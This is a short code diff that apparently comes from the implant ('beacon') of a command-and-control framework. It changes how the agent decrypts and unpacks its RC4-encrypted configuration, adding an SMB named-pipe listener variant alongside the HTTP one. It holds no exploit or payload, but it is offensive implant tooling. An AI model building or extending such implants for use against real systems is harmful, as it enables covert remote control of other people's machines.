@@ -20,8 +20,9 @@ AgentConfig::AgentConfig()
 
 	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
 	
-	this->agent_type    = packer->Unpack32();
+	this->agent_type = packer->Unpack32();
 	
+#if defined(BEACON_HTTP)
 	this->profile.use_ssl       = packer->Unpack8();
 	this->profile.port          = packer->Unpack32();
 	this->profile.servers_count = packer->Unpack32();
@@ -36,6 +37,15 @@ AgentConfig::AgentConfig()
 	this->profile.http_headers = packer->UnpackBytesCopy(&length);
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
+
+	this->listener_type = 0;
+
+#elif defined(BEACON_SMB)
+
+	this->profile.pipename = packer->UnpackBytesCopy(&length);
+	this->listener_type = packer->Unpack32();
+
+#endif
 
 	this->sleep_delay  = packer->Unpack32();
 	this->jitter_delay = packer->Unpack32();
